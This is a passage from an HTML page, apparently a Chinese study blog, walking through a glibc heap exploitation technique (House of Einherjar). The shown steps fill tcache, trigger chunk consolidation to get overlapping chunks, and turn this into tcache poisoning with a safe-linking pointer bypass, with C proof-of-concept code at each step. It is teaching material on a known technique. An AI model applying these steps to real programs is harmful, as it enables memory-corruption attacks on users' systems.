+</span><span id="__span-3-13"><span class="linenos" data-linenos="13 "></span><span class="w">        </span><span class="n">malloc_printerr</span><span class="p">(</span><span class="s">&quot;corrupted double-linked list&quot;</span><span class="p">);</span>
+</span><span id="__span-3-14"><span class="linenos" data-linenos="14 "></span>
+</span><span id="__span-3-15"><span class="linenos" data-linenos="15 "></span><span class="w">    </span><span class="c1">// 断链操作</span>
+</span><span id="__span-3-16"><span class="linenos" data-linenos="16 "></span><span class="w">    </span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bk</span><span class="p">;</span>
+</span><span id="__span-3-17"><span class="linenos" data-linenos="17 "></span><span class="w">    </span><span class="n">bk</span><span class="o">-&gt;</span><span class="n">fd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fd</span><span class="p">;</span>
+</span><span id="__span-3-18"><span class="linenos" data-linenos="18 "></span>
+</span><span id="__span-3-19"><span class="linenos" data-linenos="19 "></span><span class="w">    </span><span class="c1">// ....</span>
+</span><span id="__span-3-20"><span class="linenos" data-linenos="20 "></span><span class="p">}</span>
+</span></code></pre></div>
+<h3 id="step-4">Step 4</h3>
+<p>现在我们进行 <code>free(c)</code>，但是要注意如果合并后的大小在 tcache 范围内，我们还要先填满 tcache，避免落入 tcache。</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-4-1"><span class="linenos" data-linenos=" 1 "></span><span class="c1">// 申请七个块，再释放，这样塞满 Tcache</span>
+</span><span id="__span-4-2"><span class="linenos" data-linenos=" 2 "></span><span class="kt">intptr_t</span><span class="w"> </span><span class="o">*</span><span class="n">x</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span>
+</span><span id="__span-4-3"><span class="linenos" data-linenos=" 3 "></span><span class="k">for</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">&lt;</span><span class="k">sizeof</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">intptr_t</span><span class="o">*</span><span class="p">);</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-4-4"><span class="linenos" data-linenos=" 4 "></span><span class="w">    </span><span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">);</span>
+</span><span id="__span-4-5"><span class="linenos" data-linenos=" 5 "></span><span class="p">}</span>
+</span><span id="__span-4-6"><span class="linenos" data-linenos=" 6 "></span><span class="k">for</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">&lt;</span><span class="k">sizeof</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">/</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">intptr_t</span><span class="o">*</span><span class="p">);</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-4-7"><span class="linenos" data-linenos=" 7 "></span><span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">x</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+</span><span id="__span-4-8"><span class="linenos" data-linenos=" 8 "></span><span class="p">}</span>
+</span><span id="__span-4-9"><span class="linenos" data-linenos=" 9 "></span>
+</span><span id="__span-4-10"><span class="linenos" data-linenos="10 "></span><span class="c1">// free(C) 触发合并</span>
+</span><span id="__span-4-11"><span class="linenos" data-linenos="11 "></span><span class="n">free</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+</span></code></pre></div>
+<p><img alt="" src="../../../../../../asset/image/ccaf30fc3911ad7607f494ca5f613905/20260106123354.png" /></p>
+<h3 id="step-5">Step 5</h3>
+<p>然后我们再来申请一次内存，从而有堆块重叠。尤其是 D 完全包裹了 B，这个算是变形版本的 Double Refrence（两个 malloced 指针指向同一片内存）。</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-5-1"><span class="linenos" data-linenos="1 "></span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x158</span><span class="p">)</span>
+</span></code></pre></div>
+<p><img alt="" src="../../../../../../asset/image/ccaf30fc3911ad7607f494ca5f613905/20260106124505.png" /></p>
+<p>这里多说一句为什么 chunkD 中的第二行会改变？他经过了这样的逻辑：</p>
+<ul>
+<li>当从 unsorted 找到后，会放入 tcache 中（0x158 这个大小的 tcache 现在是空的），所以会修改 <code>e-&gt;fd</code> 和 <code>e-&gt;key</code>，也就是第二行的内容。</li>
+<li>然后从 tcache 拿出来的时候，会进行 <code>e-&gt;key = 0</code>，所以这就是为什么第二行右边是 0 了。</li>
+</ul>
+<h3 id="step-6">Step 6</h3>
+<p>现在有了变形版本的 Doulbe Refrence，chunkD 指向的内存包裹了 chunkB，我们完全就按照各种攻击方式去做就可以了。</p>
+<p>对于 Double Refrence，常见的就是转成 tcache poisoning，即这里先 <code>free(b)</code>，然后利用 chunkD 修改 <code>b-&gt;next</code>，最后两次 <code>malloc</code> 就可以了。</p>
+<div class="language-c highlight"><pre><span></span><code><span id="__span-6-1"><span class="linenos" data-linenos=" 1 "></span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,</span><span class="se">\n</span><span class="s">&quot;</span>
+</span><span id="__span-6-2"><span class="linenos" data-linenos=" 2 "></span><span class="w">        </span><span class="s">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+</span><span id="__span-6-3"><span class="linenos" data-linenos=" 3 "></span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">pad</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">);</span>
+</span><span id="__span-6-4"><span class="linenos" data-linenos=" 4 "></span><span class="n">free</span><span class="p">(</span><span class="n">pad</span><span class="p">);</span>
+</span><span id="__span-6-5"><span class="linenos" data-linenos=" 5 "></span>
+</span><span id="__span-6-6"><span class="linenos" data-linenos=" 6 "></span><span class="n">free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
+</span><span id="__span-6-7"><span class="linenos" data-linenos=" 7 "></span><span class="n">d</span><span class="p">[</span><span class="mh">0x30</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">8</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">target</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="p">((</span><span class="kt">long</span><span class="p">)</span><span class="o">&amp;</span><span class="n">d</span><span class="p">[</span><span class="mh">0x30</span><span class="o">/</span><span class="mi">8</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="mi">12</span><span class="p">);</span>
+</span><span id="__span-6-8"><span class="linenos" data-linenos=" 8 "></span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">);</span>
+</span><span id="__span-6-9"><span class="linenos" data-linenos=" 9 "></span>
+</span><span id="__span-6-10"><span class="linenos" data-linenos="10 "></span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x28</span><span class="p">);</span>
+</span></code></pre></div>
+<p>修改 <code>b-&gt;next</code> 因为 safe-linking 需要知道 heap 地址，但翻看前面的 Step 3，我们要达成攻击要知道 heap 地址，所以这也意味着 house of einherjar 可以了，那最后这步的 tcache poisoning 也可以。</p>
+<h2 id="_4">补充</h2>
+<p>上面的例子中，我们能否把 chunkB 去掉？最终直接就是达到 chunkA 和 红色框 有交叠？</p>
+<p>回答：可以，修改源代码之后发现也可以这样做。</p>
+<p><img alt="" src="../../../../../../asset/image/ccaf30fc3911ad7607f494ca5f613905/20260106121934.png" /></p>
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+
+
+
+  <form class="md-feedback" name="feedback" hidden>
+    <fieldset>
+      <legend class="md-feedback__title">
+        Was this page helpful?
+      </legend>
+      <div class="md-feedback__inner">
+        <div class="md-feedback__list">
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page was helpful" data-md-value="1">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 9v12H1V9zm4 12a2 2 0 0 1-2-2V9c0-.55.22-1.05.59-1.41L14.17 1l1.06 1.06c.27.27.44.64.44 1.05l-.03.32L14.69 8H21a2 2 0 0 1 2 2v2c0 .26-.05.5-.14.73l-3.02 7.05C19.54 20.5 18.83 21 18 21zm0-2h9.03L21 12v-2h-8.79l1.13-5.32L9 9.03z"/></svg>
+            </button>
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page could be improved" data-md-value="0">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 15V3h4v12zM15 3a2 2 0 0 1 2 2v10c0 .55-.22 1.05-.59 1.41L9.83 23l-1.06-1.06c-.27-.27-.44-.64-.44-1.06l.03-.31.95-4.57H3a2 2 0 0 1-2-2v-2c0-.26.05-.5.14-.73l3.02-7.05C4.46 3.5 5.17 3 6 3zm0 2H5.97L3 12v2h8.78l-1.13 5.32L15 14.97z"/></svg>
+            </button>
+          
+        </div>
+        <div class="md-feedback__note">
+          
+            <div data-md-value="1" hidden>
+              
+              
+                
+              
+              
+              
+                
+                
+              
+              Thanks! You can leave some advices in the comment section below. 
+            </div>
+          
+            <div data-md-value="0" hidden>
+              
+              
+                
+              
+              
+              
+              
+            </div>
+          
+        </div>
+      </div>
+    </fieldset>
+  </form>
+
+
+<h2 id="__comments">Comments</h2>
+<!-- Insert generated snippet here -->
+
+<script src="https://giscus.app/client.js"
+    data-repo="masterAllen/masterAllen.github.io"
+    data-repo-id="R_kgDOM_LyMQ"
+    data-category="General"
+    data-category-id="DIC_kwDOM_LyMc4Cl7rg"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="zh-CN"
+    crossorigin="anonymous"
+    async>
+</script>
+
+<!-- Synchronize Giscus theme with palette -->
+<script>
+    var giscus = document.querySelector("script[src*=giscus]")
+
+    // Set palette on initial load
+    var palette = __md_get("__palette")
+    if (palette && typeof palette.color === "object") {
+        var theme = palette.color.scheme === "slate"
+            ? "transparent_dark"
+            : "light"
+
+        // Instruct Giscus to set theme
+        giscus.setAttribute("data-theme", theme)
+    }
+
+    // Register event handlers after documented loaded
+    document.addEventListener("DOMContentLoaded", function () {
+        var ref = document.querySelector("[data-md-component=palette]")
+        ref.addEventListener("change", function () {
+            var palette = __md_get("__palette")
+            if (palette && typeof palette.color === "object") {
+                var theme = palette.color.scheme === "slate"
+                    ? "transparent_dark"
+                    : "light"
+
+                // Instruct Giscus to change theme
+                var frame = document.querySelector(".giscus-frame")
+                frame.contentWindow.postMessage(
+                    { giscus: { setConfig: { theme } } },
+                    "https://giscus.app"
+                )
+            }
+        })
+    })
+</script>
+
+                      
+                    
+                  </article>
+                  
+                    <div class="vercount-stats md-typeset" aria-label="网站访问统计">
+                      <span>本文阅读 <span id="vercount_value_page_pv">Loading</span> 次</span>
+                      <span>本站访问 <span id="vercount_value_site_pv">Loading</span> 次</span>
+                      <span>访客 <span id="vercount_value_site_uv">Loading</span> 人</span>
+                    </div>
+                  
+                </div>
+              
+              
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+            </div>
+            
+          </main>
+          
+            <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../../05.large/01.large_bin_attack/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 01.large_bin_attack.md">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-left" viewBox="0 0 24 24"><path d="m12 19-7-7 7-7M19 12H5"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                01.large_bin_attack.md
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../02.overlapping_chunk/" class="md-footer__link md-footer__link--next" aria-label="Next: 02.overlapping_chunk.md">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                02.overlapping_chunk.md
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-right" viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2024 ~ now | 🚀 HONG Anlun (allen hong)
+    </div>
+  
+  
+    <div class="md-copyright__generator">
+      Made with
+      <a href="https://zensical.org/" target="_blank" rel="noopener">
+        Zensical
+      </a>
+    </div>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+          
+        </div>
+      </div>
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate":null,"base":"../../../../../..","features":["navigation.instant","navigation.prune","navigation.tabs","navigation.path","navigation.indexes","header.autohide","navigation.footer"],"search":"../../../../../../assets/javascripts/workers/search.e2d2d235.min.js","tags":null,"translations":{"clipboard.copied":"Copied to clipboard","clipboard.copy":"Copy to clipboard","search.result.more.one":"1 more on this page","search.result.more.other":"# more on this page","search.result.none":"No matching documents","search.result.one":"1 matching document","search.result.other":"# matching documents","search.result.placeholder":"Type to start searching","search.result.term.missing":"Missing","select.version":"Select version"},"version":null}</script>
+    
+    
+      
+      <script src="../../../../../../assets/javascripts/bundle.dbc0afdc.min.js"></script>
+      
+        <script src="../../../../../../javascripts/copy.js"></script>
+      
+        <script src="../../../../../../javascripts/code-blocks.js"></script>
+      
+        <script src="../../../../../../javascripts/collapsible-headings.js"></script>
+      
+        <script src="../../../../../../javascripts/hide-details-toc.js"></script>
+      
+        <script src="../../../../../../javascripts/resizable-sidebar.js"></script>
+      
+        <script src="../../../../../../javascripts/sidebar-toggle-buttons.js"></script>
+      
+        <script src="../../../../../../javascripts/review-tracker.js"></script>
+      
+        <script src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+        <script src="../../../../../../javascripts/katex.js"></script>
+      
+        <script src="https://unpkg.com/katex@0/dist/katex.min.js"></script>
+      
+        <script src="https://unpkg.com/katex@0/dist/contrib/auto-render.min.js"></script>
+      
+      <script defer src="../../../../../../javascripts/archive-filter.js"></script>
+      <script defer src="../../../../../../javascripts/pdf-inline.js"></script>
+      <script defer src="../../../../../../javascripts/html-inline.js" data-resource-origin=""></script>
+      <script defer src="../../../../../../javascripts/media-notes.js?v=20261021"></script>
+      
+      
+      
+        <script defer src="https://events.vercount.one/js"></script>
+      
+    
+  </body>
+</html>
